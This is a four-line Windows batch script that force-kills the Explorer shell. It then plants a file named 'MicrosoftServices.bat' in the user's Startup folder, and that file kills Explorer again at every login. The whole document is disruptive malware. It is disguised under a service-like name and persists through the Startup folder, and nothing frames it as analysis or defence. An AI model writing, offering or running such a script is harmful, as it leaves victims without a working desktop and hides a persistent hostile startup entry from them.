taskkill -f -im explorer.exe
cd C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
type NUL>MicrosoftServices.bat
@echo taskkill -f -im explorer.exe> MicrosoftServices.bat
